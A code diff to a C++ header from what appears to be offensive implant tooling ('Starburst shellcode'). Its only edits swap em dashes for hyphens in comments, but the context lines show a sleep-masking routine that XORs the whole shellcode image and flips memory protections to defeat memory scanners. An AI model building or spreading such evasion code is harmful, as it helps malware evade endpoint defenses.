@@ -1,5 +1,5 @@
 /*
- * mask_full_image.h — Full shellcode image masking during sleep.
+ * mask_full_image.h - Full shellcode image masking during sleep.
  *
  * Masks the ENTIRE Starburst shellcode image (code + data in .text)
  * during sleep, not just sensitive fields. This defeats memory scanners
@@ -87,7 +87,7 @@ static auto declfn flip_protection(
 }
 
 /*
- * evasion_pre_sleep — Full image mask before sleeping.
+ * evasion_pre_sleep - Full image mask before sleeping.
  *
  * Call this instead of the default xor_sensitive_data().
  */
@@ -104,13 +104,13 @@ auto declfn evasion_pre_sleep( instance& inst ) -> void {
     uintptr_t self = reinterpret_cast<uintptr_t>( &evasion_pre_sleep );
     xor_image( inst, self, 0x100 );
 
-    /* Flip back to RX (masked but executable — the masked bytes are
+    /* Flip back to RX (masked but executable - the masked bytes are
        not our code path, we're done with them) */
     flip_protection( inst, PAGE_EXECUTE_READ );
 }
 
 /*
- * evasion_post_sleep — Unmask full image after waking.
+ * evasion_post_sleep - Unmask full image after waking.
  */
 auto declfn evasion_post_sleep( instance& inst ) -> void {
     if ( !inst.evasion.ekko.initialized ) return;
